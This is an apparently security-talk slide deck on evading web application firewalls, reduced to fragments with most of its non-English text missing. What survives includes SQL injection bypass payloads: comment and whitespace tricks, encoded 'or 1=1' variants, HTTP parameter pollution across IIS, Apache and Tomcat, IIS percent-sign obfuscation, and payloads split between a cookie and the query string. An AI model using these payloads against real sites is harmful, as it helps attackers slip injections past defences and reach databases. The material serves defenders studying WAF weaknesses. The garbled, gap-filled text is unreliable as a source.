Web
Safe3 http://wzb.360.cn


· WAF · WAF · 


· 80%
­ web(DiscuzDedecms) ­  ­ Web server ­ () ­ ()

WAF
· Barracuda Imperva  · ModSecurity  · Cloudflare  · phpidsdotnetids

WAF
· 
SSLweb
· 
SSL web
· 
SSL web
· 
SSL web

WAF
· WAF
Cloudflare(200035PV 12%) 


· WAF · WAF · 

WAF
· WAF
­ TCPHTTP WAFTCP
­ HTTPHTTP 
­ HTTP HTTP webserverHTTP

· Mysql andor
: id=1 or 1 = 1id=1 and 1 = 1 : id=1 || 1 = 1id=1 && 1 = 1
phpor||and&&
id=1-0id=1+0

Sql

· 
: id=1%20or%201=1 : id=1+or+1=1
id=1%0bor%0b1=1 id=1--s%0aor--s%0a1=1 id=1/*!or*/1=1 id=1()or(1=1)

Sql

 

Sql

· HTTP

par1=val1&par1=val2webserver

+------------------------------------------------------------------+

| ASP.NET/IIS |  | par1=val1,val2 |

| ASP/IIS |  | par1=val1,val2 |

| PHP/Apache | | par1=val2 |

| JSP/Tomcat |  | par1=val1 |

| Perl/Apache | | par1=val1 |

| DBMan

|| par1=val1~~val2 |

+------------------------------------------------------------------+

· 
: id=1%20or%201=1 : id=1/*&id=*/or/*&id=*/1=1

Sql

IISid=1/**/or/**/1=1

RFC :

: a-z, A-Z, 0-9 and _ . ! ~ * ' ()

 : ; / ? : @ & = + $ ,

 : { } | \ ^ [ ] `



| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |

| ?test[1=2 | test_1=2

| test[1=2 |

| ?test=% | test=%

| test= |

| ?test%00=1| test=1

| test=1 |

| ?test=1%001 | NULL

| test=1 |

| ?test=1+1 | test=1 1

| test=1 1 |

Sql

· IIS
: id=1%20or%201=1 : id=1%%20%o%r%20%1%=1

Sql

IIS%16 %

Sql
· IISHTTP
: POST /test.asp HTTP/1.1\r\nHost: 192.168.1.2\r\nContent-Length: 15\r\nContent-Type: application/x-www-formurlencoded\r\n\r\nid=1%20or%201=1
: GET /test.asp HTTP/1.1\r\nHost: 192.168.1.2\r\nContent-Length: 15\r\nContent-Type: application/x-www-formurlencoded\r\n\r\nid=1%20or%201=1
IIS asp Request ("id")idWAFGET \r\n\r\n

Sql
· GPC HTTP
HTTP: POST /test.aspx?id=1/* HTTP/1.1 Host: 192.168.1.2 Content-Length: 6 Cookie: id=*/1=1;path=/ Content-Type: application/x-www-form-urlencoded
id= */or/*
IIS aspx Request.Params["id"]idid=1/* */or/**/1=1WAF


· WAF · WAF · 


· WAF HTTPWAF 
· WAF360 DNS+ CDN+WAF DDOS
· web 

Q&A

  
71D1 100025
Block 1, Area D, Huitong Times Plaza No.71 JianGuo Road, ChaoYang District Beijing 100025, P.R.C.
Tel: +86 10 5878 1000 Fax: +86 10 5878 1001

